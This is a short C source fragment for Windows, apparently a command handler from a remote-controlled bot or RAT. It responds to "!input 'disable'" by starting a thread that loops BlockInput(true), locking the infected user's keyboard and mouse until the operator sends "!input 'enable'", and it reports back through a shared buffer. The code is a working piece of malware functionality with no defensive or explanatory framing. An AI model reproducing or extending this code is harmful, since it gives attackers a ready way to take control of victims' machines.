#include <winable.h>

bool input(char CmdLine[500]);
void LoopBlock(void);

bool EnableBlock = true;

bool input(char CmdLine[500])
{
	DWORD		BlockThreadId;

	if(CheckCmdLine(CmdLine, 2) == true)
	{
		if(lstrcmp(CmdLine, "!input 'disable'") == 0)
		{
			EnableBlock = false;
			if(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)LoopBlock, 0, 0, &BlockThreadId) != 0)
			{
				lstrcpy(MainBuffer, "Keyboard and mouse disabled.");
				return true;
			}
		}
		
		if(lstrcmp(CmdLine, "!input 'enable'") == 0)
		{
			lstrcpy(MainBuffer, "Keyboard and mouse enabled.");
			EnableBlock = true;
			return true;
		}
	}

	return false;
}

void LoopBlock(void)
{
	while(EnableBlock == false)
	{
		BlockInput(true);
	}

	BlockInput(false);
	return;
}